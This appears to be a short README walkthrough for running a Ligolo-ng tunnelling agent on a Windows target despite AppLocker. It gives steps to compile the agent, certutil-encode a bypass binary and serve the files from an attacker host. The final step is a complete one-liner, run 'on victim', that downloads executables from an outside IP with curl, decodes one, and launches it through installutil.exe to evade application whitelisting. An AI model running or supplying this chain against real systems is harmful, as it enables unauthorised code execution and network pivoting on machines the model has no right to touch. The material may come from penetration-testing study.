### <ins>Step 1: Modify the Ligolo-ng agent's main file</ins>
  - Clone ligolo-ng repo: https://github.com/nicocha30/ligolo-ng. 
  - Open and edit main.go to adjust the settings as needed: /ligolo-ng/cmd/agent/main.go 
   
  - <img width="653" alt="{CAC55401-20B8-42A1-BCDE-EBF6E1DFC442}" src="https://github.com/user-attachments/assets/4d52a625-d15d-477d-a46e-63659f503c42" /> 

### <ins>Step 2: Compile the agent<ins/> 
  - Use the following command to compile: 
  - `GOOS=windows go build -o agent.exe cmd/agent/main.go`

### <ins>Step 3: Encode the ApplockerBypassExternalBinary executable with certutil<ins/> 
  - `certutil -encode .\ApplockerBypassExternalBinary.exe AppLockerBypassLigolo.txt`

### <ins>Step 4: Execution on the Target Machine<ins/>
  - Name the agent executable `ligolo-agent.exe` 
  - Make sure both executable and the encoded .txt file in the same directory, then serve them with python server.

### <ins/>Step 5: Execution in Action!<ins/> 
  - On victim, run: `cmd.exe /c curl http://192.168.45.185/ligolo-agent.exe -o C:\users\public\try-agent.exe && curl http://192.168.45.185/  AppLockerBypassLigolo.txt -o C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe`
